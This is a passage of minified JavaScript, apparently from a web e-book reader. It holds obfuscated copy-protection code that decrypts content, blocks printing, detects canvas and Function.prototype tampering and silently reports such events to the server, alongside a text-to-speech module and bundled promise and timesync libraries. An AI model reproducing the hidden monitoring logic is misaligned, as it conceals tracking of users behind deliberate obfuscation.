_0x21f657={};_0x21f657[_0x4139('0x11')]=_0x4139('0x10');_0x21f657['iv']=_0x5ca595;_0x21f657[_0x4139('0x20')]=0x80;return _0x310508()[_0x4139('0x24')][_0x4139('0x2')](_0x21f657,_0x1a488d,_0x3001f4);}};var _0x573bc8=function(_0x5e0f7a,_0x4442e9){if(_0x5e0f7a[_0x4139('0x1a')]){_0x5e0f7a[_0x4139('0x1a')](_0x4442e9)[_0x4139('0x16')](_0x37ab27);}else{_0x5e0f7a[_0x4139('0x2b')]=function(_0x591dba){_0x4442e9(_0x591dba[_0x4139('0x29')][_0x4139('0x1f')]);};}};var _0x45af94=function(_0x33a789,_0x1f709e,_0x5cb76a){var _0x3d6e2c=encodeURIComponent(_0x1f709e)+'='+encodeURIComponent(_0x5cb76a);var _0x38257a=document[_0x4139('0x27')]('a');_0x38257a['href']=_0x33a789;_0x38257a[_0x4139('0x19')]=_0x38257a[_0x4139('0x19')][_0x4139('0x4')]?_0x38257a[_0x4139('0x19')]+'&'+_0x3d6e2c:'?'+_0x3d6e2c;return _0x38257a[_0x4139('0xa')];};var _0x577f44=function(_0xa103e6,_0x34a7e5){var _0x5c00ba=_0x5594b2(_0xa103e6);var _0x48543f=document[_0x4139('0x27')]('form');_0x48543f[_0x4139('0x15')]=_0x45af94(document['location'][_0x4139('0xa')],'favre',_0x4139('0x22'));_0x48543f[_0x4139('0x14')]=_0x4139('0x23');var _0x4b0747=document[_0x4139('0x27')](_0x4139('0x12'));_0x4b0747['type']=_0x4139('0x13');_0x4b0747[_0x4139('0x11')]=_0x4139('0x21');_0x4b0747[_0x4139('0x1')]=_0x5c00ba;_0x48543f['appendChild'](_0x4b0747);var _0xffeb43=document[_0x4139('0x27')](_0x4139('0x12'));_0xffeb43[_0x4139('0x17')]=_0x4139('0x13');_0xffeb43[_0x4139('0x11')]=_0x4139('0x9');_0xffeb43[_0x4139('0x1')]=_0x34a7e5;_0x48543f[_0x4139('0x5')](_0xffeb43);document[_0x4139('0x28')]['appendChild'](_0x48543f);_0x48543f[_0x4139('0xb')]();};var _0xf2573d=function(_0x50b077){var _0x50bb77=atob(_0x50b077);var _0x11d5fb=_0x50bb77[_0x4139('0x4')];var _0x3ca53f=new Uint8Array(_0x11d5fb);for(var _0x3672ba=0x0;_0x3672ba<_0x11d5fb;_0x3672ba++){_0x3ca53f[_0x3672ba]=_0x50bb77['charCodeAt'](_0x3672ba);}return _0x3ca53f[_0x4139('0x26')];};var _0x75431d=function(_0x454e43){var _0x142714=document['getElementById'](_0x4139('0xc'));var _0x5620e5=_0x142714?_0x142714[_0x4139('0xf')]:document[_0x4139('0x28')][_0x4139('0xf')];var _0x2c3b48=_0x5620e5[_0x4139('0x0')](':');var _0x108799=new Uint8Array(_0x2c3b48[0x0]['trim']()[_0x4139('0x0')](','));var _0xc4ff3f=_0x2c3b48[0x1][_0x4139('0x6')]();var _0x5d600f=_0xf2573d(_0xc4ff3f);var _0x90a466=_0x507052(_0x454e43,_0x5d600f,_0x108799);_0x573bc8(_0x90a466,function(_0x21ac95){return _0x577f44(_0x21ac95,_0x108799);});};_0x573bc8(_0x2d1373(_0x1c47c5),_0x75431d);}catch(_0x2b6b17){_0x37ab27(_0x2b6b17);}", "contains", "setAttribute", "head", "favrescript", "createElement", "body", "load", "innerText", "favre", "contentDocument", "addEventListener", "innerHTML", "add"];
!function(t, e) {
    (function(e) {
        for (; --e;)
            t.push(t.shift())
    })(++e)
}(_0xd729, 361);
var _0xb4fe = function(e) {
    return _0xd729[e -= 0]
};
_0x47de0a(),
setInterval(_0x47de0a, 2500);
var _0x4232 = ["call", "src", "cssText", "url", "styleSheets", "prototype", "events", "dataType", "exists", '"To print, please use the print page range feature within the application."', "length", "30ytoHEq", "1WyyMDL", "1354105IMFbKF", "/events", "json", "print", "1890439vuKXhT", "421338jLfnWY", "epub-content", "indexOf", "cssRules", "573290cnrwRF", "EBCLogger", 'body::before { content: "To print, please use the print page range feature within the application."; display: block !important; }', "data", "style", "1314097LZTmNa", "content", "type", "getariasrc", "131114otdoBA", "toLowerCase", "contentDocument", "ajax", "media", "3gEmlTh", "POST", "body > * { overflow: hidden; display: none !important; height: 0px !important; width: 0px !important; }", "29173nxtfTM", "name", "toDataURL", "toBlob"],
    _0x2848 = function(e) {
        return _0x4232[e -= 344]
    };
(function(e, t) {
    for (var n = _0x2848;;)
        try {
            if (parseInt(n(378)) * parseInt(n(363)) + parseInt(n(351)) + -parseInt(n(355)) + parseInt(n(385)) + -parseInt(n(380)) + -parseInt(n(384)) * parseInt(n(379)) + parseInt(n(360)) * parseInt(n(346)) === t)
                break;
            e.push(e.shift())
        } catch (o) {
            e.push(e.shift())
        }
})(_0x4232, 954837),
function() {
    var F = _0x2848,
        A = HTMLCanvasElement[F(372)][F(366)],
        _ = HTMLCanvasElement[F(372)][F(365)],
        B = Function[F(372)][F(367)],
        H = !1,
        R = 0,
        L = !1;
    setInterval(function() {
        var e = F;
        if (!H) {
            var t = document.getElementById(e(386));
            if (t)
                for (var n = t[e(357)][e(371)], o = 0; o < n[e(377)]; ++o) {
                    var i = n[o];
                    if (String(i[e(359)])[e(356)]() == e(383)) {
                        var r = {};
                        r.cssText = e(348),
                        r[e(375)] = !1;
                        var a = {};
                        a[e(369)] = e(362),
                        a[e(375)] = !1;
                        for (var s = [r, a], l = !1, c = i[e(345)][e(377)] - 1; 0 <= c; --c) {
                            var u = i[e(345)][c];
                            u[e(350)] && u[e(350)][e(352)] && u[e(350)].content === e(376) && (l = !0);
                            for (var d = 0; d < s[e(377)] - 1; d++)
                                -1 !== u[e(369)][e(344)](s[d][e(369)]) && (s[d][e(375)] = !0)
                        }
                        for (var f = !0, h = 0; h < s[e(377)] - 1; h++)
                            !s[h][e(375)] && (f = !1);
                        if (!l) {
                            H = !0;
                            var p = {};
                            p[e(364)] = e(347),
                            p.m = "cp",
                            p.f = "j";
                            var g = {};
                            g[e(373)] = [p];
                            var m = {};
                            m[e(370)] = "/events",
                            m[e(353)] = "POST",
                            m[e(349)] = g,
                            m[e(374)] = e(382),
                            $[e(358)](m)
                        }
                        if (!f) {
                            H = !0;
                            var v = {};
                            v[e(364)] = e(347),
                            v.m = "c",
                            v.f = "j";
                            var T = {};
                            T.events = [v];
                            var S = {};
                            S[e(370)] = "/events",
                            S[e(353)] = e(361),
                            S[e(349)] = T,
                            S[e(374)] = e(382),
                            $[e(358)](S)
                        }
                    }
                }
        }
        var y = HTMLCanvasElement[e(372)][e(366)] !== A,
            b = HTMLCanvasElement.prototype.toDataURL !== _,
            x = Function[e(372)].call !== B,
            w = "";
        if ((y || b || x) && (y && (w += "f1"), b && (w += "f2"), x && (w += "f3"), !H)) {
            H = !0;
            var V = {};
            V[e(364)] = e(347),
            V.m = w,
            V.f = "j";
            var C = {};
            C[e(373)] = [V];
            var k = {};
            k[e(370)] = e(381),
            k[e(353)] = e(361),
            k[e(349)] = C,
            k[e(374)] = e(382),
            $[e(358)](k)
        }
        var E = document.getElementById(e(386));
        if (E)
            if (E[e(354)] && E[e(354)] !== E[e(368)]) {
                if (R += 1, !L && 3 < R) {
                    L = !0;
                    var I = {};
                    I[e(364)] = e(347),
                    I.m = "arsr",
                    I.f = "j";
                    var N = {};
                    N[e(373)] = [I];
                    var P = {};
                    P[e(370)] = e(381),
                    P[e(353)] = e(361),
                    P.data = N,
                    P.dataType = e(382),
                    $[e(358)](P)
                }
                E[e(354)] = E[e(368)]
            } else
                !E[e(354)] && (E[e(354)] = E[e(368)])
    }, 3e3)
}(),
VST.TTS = {
    _: {
        currentRate: 1,
        currentPitch: 1,
        currentVolume: 1,
        currentVoice: window.speechSynthesis && window.speechSynthesis.getVoices()[0],
        currentLang: "en-US"
    }
},
VST.TTS._.messageDump = [],
VST.TTS._.messageHistory = [];
var ___no_op = !0;
!function(e) {
    e._.chunkElement = function(e) {
        var t = VST.$(e).contents(),
            n = VST.$(e).text().length;
        if (0 < t.length && (250 < n || 5 < t.length)) {
            for (var o = [], i = 0; i < t.length; i++) {
                if (t.length < 12 && t[i].className && t[i].className.match("vstignore|vstskip|vsthighlight"))
                    return [e];
                o = 3 === t[i].nodeType ? o.concat(t[i]) : o.concat(VST.TTS._.chunkElement(t[i]))
            }
            return o
        }
        return [e]
    },
    e._.updateProp = function(e, t, n) {
        VST.TTS._[e] = n;
        var o = VST.TTS._.messageDump;
        0 < o.length && (o[o.length - 1][t] = n)
    },
    e.addTTSCSS = function() {
        var e = VST.document.createElement("style");
        e.setAttribute("type", "text/css"),
        e.innerText = ".tts-highlight { background: yellow !important; }",
        VST.document.body.appendChild(e)
    },
    e.unhighlightElements = function() {
        VST.Book.isPBK() ? VST.$(VST.document).find(".tts-highlight").remove(
        ) : VST.$(VST.document).find(".tts-highlight").removeClass("tts-highlight")
    },
    e.highlightElement = function(e) {
        if (VST.TTS.unhighlightElements(), VST.Book.isPBK()) {
            var t = VST.document.getElementById("pbk-search"),
                n = VST.PictureBook.findTermsWithoutNormalization(t, [VST.$(e).text().trim()], "#FF0000");
            VST.PictureBook.highlightNodes(n, "transparent", "tts-highlight")
        } else {
            3 === e.nodeType && (e = VST.$(e).parent()),
            VST.$(e).addClass("tts-highlight");
            var o = VST.$(e).position().top;
            VST.scrollElement.scrollTo(0, o - 20)
        }
    },
    e.readElement = function(e, t) {
        var n = VST.$(e).text().trim();
        if (0 < n.length) {
            VST.TTS._.messageHistory.push(e),
            VST.TTS.highlightElement(e);
            var o = new SpeechSynthesisUtterance(n);
            o.rate = VST.TTS._.currentRate,
            o.pitch = VST.TTS._.currentPitch,
            o.volume = VST.TTS._.currentVolume,
            o.voice = VST.TTS._.currentVoice,
            o.lang = VST.TTS._.currentLang,
            VST.TTS._.messageDump.push(o),
            o.onend = function() {
                VST.TTS.unhighlightElements(),
                t && t()
            },
            window.speechSynthesis.speak(o)
        } else
            t && t()
    },
    e.setVoice = function(e) {
        var t = window.speechSynthesis && window.speechSynthesis.getVoices();
        VST.TTS._.updateProp("currentVoice", "voice", t[e])
    },
    e.setRate = function(e) {
        VST.TTS._.updateProp("currentRate", "rate", e)
    },
    e.setPitch = function(e) {
        VST.TTS._.updateProp("currentPitch", "pitch", e)
    },
    e.setVolume = function(e) {
        VST.TTS._.updateProp("currentVolume", "volume", e)
    },
    e.setLang = function(e) {
        VST.TTS._.updateProp("currentLang", "lang", e)
    },
    e.startReading = function() {
        if ($(window).unload(function() {
            return VST.TTS.cancel(), !0
        }), 0 < VST.TTS._.currentQueue.length) {
            var e = VST.TTS._.currentQueue.shift();
            VST.TTS.readElement(e, function() {
                VST.TTS.startReading()
            })
        } else
            VST.TTS.sendStatus(),
            VST.TTS.cancel()
    },
    e.startAtTop = function() {
        var e = VST.$(VST.document).find("body");
        VST.Book.isPBK() && (e = VST.document.getElementById("pdf-ax-text"));
        var t = VST.TTS._.chunkElement(e);
        VST.TTS.cancel(),
        VST.TTS._.currentQueue = t,
        VST.TTS.startReading()
    },
    e.pause = function() {
        window.speechSynthesis.pause()
    },
    e.resume = function() {
        window.speechSynthesis.resume()
    },
    e.prev = function() {
        VST.TTS._.messageDump[VST.TTS._.messageDump.length - 1].onend = undefined,
        window.speechSynthesis.cancel(),
        VST.TTS._.currentQueue.unshift(VST.TTS._.messageHistory.pop()),
        VST.TTS._.currentQueue.unshift(VST.TTS._.messageHistory.pop()),
        VST.TTS.startReading()
    },
    e.next = function() {
        VST.TTS._.messageDump[VST.TTS._.messageDump.length - 1].onend = undefined,
        window.speechSynthesis.cancel(),
        VST.TTS.startReading()
    },
    e.cancel = function() {
        window.speechSynthesis.cancel(),
        VST.TTS._.currentQueue = [],
        VST.TTS.unhighlightElements()
    }
}(VST.TTS),
function(e) {
    e.TTSV2 = {}
}.call(this, VST),
function(e) {
    e.TTSV2.Config = {
        highlightColor: "yellow"
    }
}.call(this, VST),
function(i) {
    function r(e) {
        return -1 !== y.indexOf(e.tagName)
    }
    function n(e) {
        return -1 !== t.indexOf(e.tagName)
    }
    function e(e, t) {
        p = [],
        m = "",
        v = null,
        T = [2];
        var n = i.sharedEpubModule.locateCFI(e);
        if (g = {
            cfi: e,
            node: n.node,
            offset: n.offset
        }, a(i.document.body, t), f(), e) {
            var o = e.split(":")[1];
            o && (p[0].startCfi = e, p[0].text = p[0].text.substring(o))
        }
        return p
    }
    function a(e, t) {
        T[T.length - 1]++;
        var n = T[T.length - 1] % 2 == 0;
        (1 === e.nodeType && !n || 3 === e.nodeType && n) && T[T.length - 1]++,
        S = 0;
        var o = "/" + T.join("/");
        if (d(o))
            if (3 === e.nodeType)
                m || h(o),
                S = e.textContent.length,
                m += e.textContent;
            else if (l(e))
                c(e);
            else if (r(e))
                h(o),
                s(e, t);
            else if ("img" === e.tagName) {
                var i = e.getAttribute("alt");
                i && t && (h(o), m = i, f())
            } else
                s(e, t);
        else
            s(e, t)
    }
    function o(e) {
        var t = [];
        return e.childNodes.forEach(function(e) {
            3 === e.nodeType ? t.push(e) : 1 === e.nodeType && (e.classList.contains("vstskip") || "MathJax_Message" === e.id || t.push(e))
        }), t.reduce(function(e, t) {
            return t.classList && t.classList.contains("vstignore") ? e.concat(o(t)) : (e.push(t), e)
        }, []).reduce(function(e, t) {
            if (0 < e.length) {
                var n = e[e.length - 1];
                if (3 === n.nodeType && 3 === t.nodeType) {
                    var o = document.createElement("div");
                    return o.appendChild(n.cloneNode()), o.appendChild(t.cloneNode()), o.normalize(), e[e.length - 1] = o.firstChild, e
                }
            }
            return e.push(t), e
        }, [])
    }
    function s(e, t) {
        n(e) || e.childNodes && (1 === e.nodeType && T.push(0), o(e).forEach(function(e) {
            a(e, t)
        }), 1 === e.nodeType && T.pop())
    }
    function l(e) {
        return !!e.getAttribute("data-mathml")
    }
    function c(e) {
        var t = e.getElementsByTagName("math")[0];
        t && "http://www.w3.org/1998/Math/MathML" === t.namespaceURI && (h("/" + T.join("/")), m += t.getAttribute("alttext") || t.textContent, f())
    }
    function u(e) {
        return (e = (e = i.sharedEpubModule.StripCFIAssertions(e)).split(":")[0]).split("/").slice(1).map(function(e) {
            return parseInt(e, 10)
        })
    }
    function d(e) {
        if (!g.cfi)
            return !0;
        for (var t = u(e), n = u(g.cfi), o = Math.min(t.length, n.length), i = 0; i < o; i++) {
            var r = t[i],
                a = n[i];
            if (r !== a)
                return a < r
        }
        return !0
    }
    function f() {
        var e = m.trim();
        if (e && v) {
            var t = "/" + T.join("/") + ":" + S;
            p.push({
                text: e,
                startCfi: v,
                endCfi: t,
                key: btoa(t)
            })
        }
        m = "",
        v = null,
        S = 0
    }
    function h(e) {
        f(),
        v = e
    }
    var p,
        g,
        m,
        v,
        T,
        S,
        t = ["script", "noscript", "style", "object", "noframes"],
        y = ["br", "hr", "tr", "td", "p", "blockquote", "title", "ul", "ol", "li", "table", "pre", "div", "h1", "h2", "h3", "h4", "h5", "h6", "article", "section", "figcaption", "figure", "dl", "dt", "dd", "aside", "address", "header", "nav", "footer", "hgroup", "caption"];
    i.TTSV2.EpubUtteranceFinder = {
        findUtterances: e
    }
}.call(this, VST),
function(r) {
    function e() {}
    function t(e) {
        var t = null;
        if (e.fromSelection) {
            var n = r.sharedEpubModule.GetCFIRangeForSelection();
            n && (t = n.base + n.begin)
        } else if (e.atHighlight) {
            var o = EpubBook.getDataForPageHighlight(e.atHighlight);
            if (o && o.cfi) {
                var i = o.cfi.split(",");
                t = i[0].split("!")[1] + i[1]
            }
        }
        return r.TTSV2.EpubUtteranceFinder.findUtterances(t, e.altEnabled)
    }
    function n() {
        r.$(r.document).find("." + a).addClass("vsthighlight"),
        r.Highlights.removeHighlight(null, a)
    }
    function o(e) {
        n();
        var t = {
            base: "/",
            begin: e.startCfi,
            end: e.endCfi
        };
        r.sharedEpubModule.HighlightRanges([t], r.TTSV2.Config.highlightColor, a),
        r.$(r.document).find("." + a).removeClass("vsthighlight")
    }
    function i(e) {
        r.sharedEpubModule.ScrollToCFI(e.startCfi, undefined, undefined, !1)
    }
    var a = "tts-v2-highlight";
    r.TTSV2.EpubController = {
        initPage: e,
        getUtterances: t,
        highlight: o,
        unhighlight: n,
        scrollTo: i
    }
}.call(this, VST),
function(c) {
    function e(e) {
        e = e || 0;
        for (var t = c.PictureBook.getText().split(/[\r\n]/), n = [], o = 0, i = 0; i < t.length; i++) {
            var r = t[i];
            if (r) {
                var a = o,
                    s = o + r.length - 1;
                if (e <= s) {
                    var l = 0;
                    a < e && (l = e - a, a = e),
                    n.push({
                        text: r.substr(l),
                        startIndex: a,
                        endIndex: s,
                        key: btoa("" + s)
                    })
                }
                o += r.length + 1
            } else
                o += 1
        }
        return n
    }
    c.TTSV2.PBKUtteranceFinder = {
        findUtterances: e
    }
}.call(this, VST),
function(o) {
    function e() {
        if (!o.document.getElementById(s)) {
            var e = o.document.createElement("style");
            e.setAttribute("type", "text/css"),
            e.innerText = "." + a + " { background: " + o.TTSV2.Config.highlightColor + " !important; }",
            o.document.body.appendChild(e);
            var t = o.document.createElement("div");
            t.className = "vstignore vstskip pbk-overlay",
            t.id = s;
            var n = o.document.getElementById("pbk-page");
            n.parentNode.insertBefore(t, n)
        }
    }
    function t(e) {
        var t = null,
            n = null;
        return e.fromSelection ? (n = o.Highlights.getHighlightDataForCurrentSelection()) && (t = n.chapter_offset) : e.atHighlight && (n = o.PictureBook.getDataForPageHighlight(e.atHighlight)) && (t = n.chapterOffset), o.TTSV2.PBKUtteranceFinder.findUtterances(t)
    }
    function n() {
        o.PictureBook.unhighlightTerms(s)
    }
    function i(e) {
        n(),
        o.PictureBook.highlightNodes([[e.startIndex, e.endIndex]], "transparent", a, s)
    }
    function r(e) {
        o.PictureBook.highlightNodes([[e.startIndex, e.startIndex]], "transparent", "tts-find-first-el", s);
        var t = o.$(o.document).find(".tts-find-first-el").position().top;
        o.scrollElement.scrollTo(0, t),
        o.$(o.document).find(".tts-find-first-el").remove()
    }
    var a = "tts-v2-highlight",
        s = "pbk-tts-v2";
    o.TTSV2.PBKController = {
        initPage: e,
        getUtterances: t,
        highlight: i,
        unhighlight: n,
        scrollTo: r
    }
}.call(this, VST),
function(t) {
    function e(e) {
        try {
            s = u.getUtterances(e || {})
        } catch (t) {
            console.error(t),
            s = []
        }
        return s
    }
    function n() {
        u.unhighlight()
    }
    function o(e) {
        u.highlight(s[e]),
        u.scrollTo(s[e])
    }
    function i(e) {
        l = e,
        r()
    }
    function r() {
        if (l) {
            var e = t.$.extend(l, {
                isReady: c
            });
            t.fire("tts-v2:status", e)
        }
    }
    function a() {
        c = !0,
        (u = t.Book.isPBK() ? t.TTSV2.PBKController : t.TTSV2.EpubController).initPage(),
        r()
    }
    var s = [],
        l = null,
        c = !1,
        u = null;
    t.bind("page:unload", function() {
        c = !(s = []),
        r()
    }),
    t.TTSV2.Main = {
        getTextChunks: e,
        highlight: o,
        unhighlight: n,
        updateStatus: i,
        initPage: a
    }
}.call(this, VST),
function(e) {
    if ("object" == typeof exports && "undefined" != typeof module)
        module.exports = e();
    else if ("function" == typeof define && define.amd)
        define([], e);
    else {
        var t;
        "undefined" != typeof window ? t = window : "undefined" != typeof global ? t = global : "undefined" != typeof self && (t = self),
        t.timesync = e()
    }
}(function() {
    return function h(r, a, s) {
        function l(n, e) {
            if (!a[n]) {
                if (!r[n]) {
                    var t = "function" == typeof require && require;
                    if (!e && t)
                        return t(n, !0);
                    if (c)
                        return c(n, !0);
                    var o = new Error("Cannot find module '" + n + "'");
                    throw o.code = "MODULE_NOT_FOUND", o
                }
                var i = a[n] = {
                    exports: {}
                };
                r[n][0].call(i.exports, function(e) {
                    var t = r[n][1][e];
                    return l(t || e)
                }, i, i.exports, h, r, a, s)
            }
            return a[n].exports
        }
        for (var c = "function" == typeof require && require, e = 0; e < s.length; e++)
            l(s[e]);
        return l
    }({
        1: [function(e, t) {
            function n() {
                for (; i.next;) {
                    var e = (i = i.next).task;
                    i.task = void 0;
                    var t = i.domain;
                    t && (i.domain = void 0, t.enter());
                    try {
                        e()
                    } catch (h) {
                        if (l)
                            throw t && t.exit(), setTimeout(n, 0), t && t.enter(), h;
                        setTimeout(function() {
                            throw h
                        }, 0)
                    }
                    t && t.exit()
                }
                a = !1
            }
            function o(e) {
                r = r.next = {
                    task: e,
                    domain: l && process.domain,
                    next: null
                },
                a || (a = !0, s())
            }
            var i = {
                    task: void 0,
                    next: null
                },
                r = i,
                a = !1,
                s = void 0,
                l = !1;
            if ("undefined" != typeof process && process.nextTick)
                l = !0,
                s = function() {
                    process.nextTick(n)
                };
            else if ("function" == typeof setImmediate)
                s = "undefined" != typeof window ? setImmediate.bind(window, n) : function() {
                    setImmediate(n)
                };
            else if ("undefined" != typeof MessageChannel) {
                var c = new MessageChannel;
                c.port1.onmessage = n,
                s = function() {
                    c.port2.postMessage(0)
                }
            } else
                s = function() {
                    setTimeout(n, 0)
                };
            t.exports = o
        }, {}],
        2: [function(e, t) {
            "use strict";
            t.exports = e("./lib/core.js"),
            e("./lib/done.js"),
            e("./lib/es6-extensions.js"),
            e("./lib/node-extensions.js")
        }, {
            "./lib/core.js": 3,
            "./lib/done.js": 4,
            "./lib/es6-extensions.js": 5,
            "./lib/node-extensions.js": 6
        }],
        3: [function(e, t) {
            "use strict";
            function n(e) {
                function i(n) {
                    null !== a ? f(function() {
                        var e = a ? n.onFulfilled : n.onRejected;
                        if (null !== e) {
                            var t;
                            try {
                                t = e(s)
                            } catch (h) {
                                return void n.reject(h)
                            }
                            n.resolve(t)
                        } else
                            (a ? n.resolve : n.reject)(s)
                    }) : l.push(n)
                }
                function n(e) {
                    try {
                        if (e === c)
                            throw new TypeError("A promise cannot be resolved with itself.");
                        if (e && ("object" == typeof e || "function" == typeof e)) {
                            var t = e.then;
                            if ("function" == typeof t)
                                return void d(t.bind(e), n, o)
                        }
                        a = !0,
                        s = e,
                        r()
                    } catch (h) {
                        o(h)
                    }
                }
                function o(e) {
                    a = !1,
                    s = e,
                    r()
                }
                function r() {
                    for (var e = 0, t = l.length; e < t; e++)
                        i(l[e]);
                    l = null
                }
                if ("object" != typeof this)
                    throw new TypeError("Promises must be constructed via new");
                if ("function" != typeof e)
                    throw new TypeError("not a function");
                var a = null,
                    s = null,
                    l = [],
                    c = this;
                this.then = function(n, o) {
                    return new c.constructor(function(e, t) {
                        i(new u(n, o, e, t))
                    })
                },
                d(e, n, o)
            }
            function u(e, t, n, o) {
                this.onFulfilled = "function" == typeof e ? e : null,
                this.onRejected = "function" == typeof t ? t : null,
                this.resolve = n,
                this.reject = o
            }
            function d(e, t, n) {
                var o = !1;
                try {
                    e(function(e) {
                        o || (o = !0, t(e))
                    }, function(e) {
                        o || (o = !0, n(e))
                    })
                } catch (i) {
                    if (o)
                        return;
                    o = !0,
                    n(i)
                }
            }
            var f = e("asap");
            t.exports = n
        }, {
            asap: 1
        }],
        4: [function(e, t) {
            "use strict";
            var n = e("./core.js"),
                o = e("asap");
            (t.exports = n).prototype.done = function() {
                (arguments.length ? this.then.apply(this, arguments) : this).then(null, function(e) {
                    o(function() {
                        throw e
                    })
                })
            }
        }, {
            "./core.js": 3,
            asap: 1
        }],
        5: [function(e, t) {
            "use strict";
            function o(i) {
                this.then = function(o) {
                    return "function" != typeof o ? this : new r(function(t, n) {
                        a(function() {
                            try {
                                t(o(i))
                            } catch (e) {
                                n(e)
                            }
                        })
                    })
                }
            }
            var r = e("./core.js"),
                a = e("asap");
            t.exports = r,
            o.prototype = r.prototype;
            var i = new o(!0),
                s = new o(!1),
                l = new o(null),
                c = new o(undefined),
                u = new o(0),
                d = new o("");
            r.resolve = function(e) {
                if (e instanceof r)
                    return e;
                if (null === e)
                    return l;
                if (e === undefined)
                    return c;
                if (!0 === e)
                    return i;
                if (!1 === e)
                    return s;
                if (0 === e)
                    return u;
                if ("" === e)
                    return d;
                if ("object" == typeof e || "function" == typeof e)
                    try {
                        var t = e.then;
                        if ("function" == typeof t)
                            return new r(t.bind(e))
                    } catch (n) {
                        return new r(function(e, t) {
                            t(n)
                        })
                    }
                return new o(e)
            },
            r.all = function(e) {
                var l = Array.prototype.slice.call(e);
                return new r(function(i, r) {
                    function a(t, e) {
                        try {
                            if (e && ("object" == typeof e || "function" == typeof e)) {
                                var n = e.then;
                                if ("function" == typeof n)
                                    return void n.call(e, function(e) {
                                        a(t, e)
                                    }, r)
                            }
                            l[t] = e,
                            0 == --s && i(l)
                        } catch (o) {
                            r(o)
                        }
                    }
                    if (0 === l.length)
                        return i([]);
                    for (var s = l.length, e = 0; e < l.length; e++)
                        a(e, l[e])
                })
            },
            r.reject = function(n) {
                return new r(function(e, t) {
                    t(n)
                })
            },
            r.race = function(e) {
                return new r(function(t, n) {
                    e.forEach(function(e) {
                        r.resolve(e).then(t, n)
                    })
                })
            },
            r.prototype["catch"] = function(e) {
                return this.then(null, e)
            }
        }, {
            "./core.js": 3,
            asap: 1
        }],
        6: [function(e, t) {
            "use strict";
            var s = e("./core.js"),
                r = e("asap");
            (t.exports = s).denodeify = function(r, a) {
                return a = a || Infinity, function() {
                    var t = this,
                        i = Array.prototype.slice.call(arguments);
                    return new s(function(n, o) {
                        for (; i.length && i.length > a;)
                            i.pop();
                        i.push(function(e, t) {
                            e ? o(e) : n(t)
                        });
                        var e = r.apply(t, i);
                        !e || "object" != typeof e && "function" != typeof e || "function" != typeof e.then || n(e)
                    })
                }
            },
            s.nodeify = function(i) {
                return function() {
                    var e = Array.prototype.slice.call(arguments),
                        t = "function" == typeof e[e.length - 1] ? e.pop() : null,
                        n = this;
                    try {
                        return i.apply(this, arguments).nodeify(t, n)
                    } catch (o) {
                        if (null == t)
                            return new s(function(e, t) {
                                t(o)
                            });
                        r(function() {
                            t.call(n, o)
                        })
                    }
                }
            },
            s.prototype.nodeify = function(t, n) {
                if ("function" != typeof t)
                    return this;
                this.then(function(e) {
                    r(function() {
                        t.call(n, null, e)
                    })
                }, function(e) {
                    r(function() {
                        t.call(n, e)
                    })
                })
            }
        }, {
            "./core.js": 3,
            asap: 1
        }],
        7: [function(e, t) {
            "use strict";
            t.exports = "undefined" == typeof window || "undefined" == typeof window.Promise ? e("promise") : window.Promise
        }, {
            promise: 2
        }],
        8: [function(e, t) {
            "use strict";
            function n(i) {
                var r = {};
                return i.emit = function(e, t) {
                    var n = r[e];
                    n && n.forEach(function(e) {
                        return e(t)
                    })
                }, i.on = function(e, t) {
                    return (r[e] || (r[e] = [])).push(t), i
                }, i.off = function(e, t) {
                    if (t) {
                        var n = r[e],
                            o = n.indexOf(t);
                        -1 !== o && n.splice(o, 1),
                        0 === n.length && delete r[e]
                    } else
                        delete r[e];
                    return i
                }, i.list = function(e) {
                    return r[e] || []
                }, i
            }
            t.exports = n
        }, {}],
        9: [function(e, t, n) {
            "use strict";
            function i(e, t, n, o, i, r) {
                try {
                    var a = new XMLHttpRequest;
                    if (a.onreadystatechange = function() {
                        if (4 == a.readyState) {
                            var e = a.getResponseHeader("Content-Type");
                            e && -1 !== e.indexOf("json") ? i(null, JSON.parse(a.responseText), a.status) : i(null, a.responseText, a.status)
                        }
                    }, o)
                        for (var s in o)
                            o.hasOwnProperty(s) && a.setRequestHeader(s, o[s]);
                    a.ontimeout = function(e) {
                        i(e, null, 0)
                    },
                    a.open(e, t, !0),
                    a.timeout = r,
                    "string" == typeof n ? a.send(n) : n ? (a.setRequestHeader("Content-Type", "application/json"), a.send(JSON.stringify(n))) : a.send()
                } catch (l) {
                    i(l, null, 0)
                }
            }
            function o(e, t, n, o) {
                i("POST", e, t, null, n, o)
            }
            n.fetch = i,
            n.post = o,
            Object.defineProperty(n, "__esModule", {
                value: !0
            })
        }, {}],
        10: [function(e, t) {
            "use strict";
            var n = "undefined" != typeof window;
            t.exports = e(n ? "./request.browser" : "./request.node")
        }, {
            "./request.browser": 9,
            "./request.node": 11
        }],
        11: [function(e, t, n) {
            "use strict";
            function o(e, t, i, n) {
                var o = "string" === t ? t : JSON.stringify(t),
                    r = u(e),
                    a = {
                        host: r.hostname,
                        port: r.port,
                        path: r.path,
                        method: "POST",
                        headers: {
                            "Content-Length": o.length
                        }
                    };
                "string" !== t && (a.headers["Content-Type"] = "application/json");
                var s = ("https:" === r.protocol ? c : l).request(a, function(n) {
                    n.setEncoding("utf8");
                    var o = "";
                    n.on("data", function(e) {
                        o += e
                    }),
                    n.on("end", function() {
                        var e = n.headers["content-type"],
                            t = e && -1 !== e.indexOf("json") ? JSON.parse(o) : o;
                        i && i(null, t, n.statusCode),
                        i = null
                    })
                });
                s.on("error", function(e) {
                    i && i(e, null, null),
                    i = null
                }),
                s.on("socket", function(e) {
                    e.setTimeout(n, function() {
                        s.abort()
                    })
                }),
                s.write(o),
                s.end()
            }
            var i = function i(e) {
                return e && e.__esModule ? e["default"] : e
            };
            n.post = o,
            Object.defineProperty(n, "__esModule", {
                value: !0
            });
            var l = i(e("http")),
                c = i(e("https")),
                u = i(e("url")).parse
        }, {
            http: undefined,
            https: undefined,
            url: undefined
        }],
        12: [function(e, t, n) {
            "use strict";
            function o(e, t) {
                return t < e ? 1 : e < t ? -1 : 0
            }
            function i(e, t) {
                return e + t
            }
            function r(e) {
                return e.reduce(i)
            }
            function a(e) {
                return r(e) / e.length
            }
            function s(e) {
                return Math.sqrt(l(e))
            }
            function l(e) {
                if (e.length < 2)
                    return 0;
                var t = a(e);
                return e.map(function(e) {
                    return Math.pow(e - t, 2)
                }).reduce(i) / (e.length - 1)
            }
            function c(e) {
                if (e.length < 2)
                    return e[0];
                var t = e.slice().sort(o);
                return t.length % 2 == 0 ? (t[e.length / 2 - 1] + t[e.length / 2]) / 2 : t[(e.length - 1) / 2]
            }
            n.compare = o,
            n.add = i,
            n.sum = r,
            n.mean = a,
            n.std = s,
            n.variance = l,
            n.median = c,
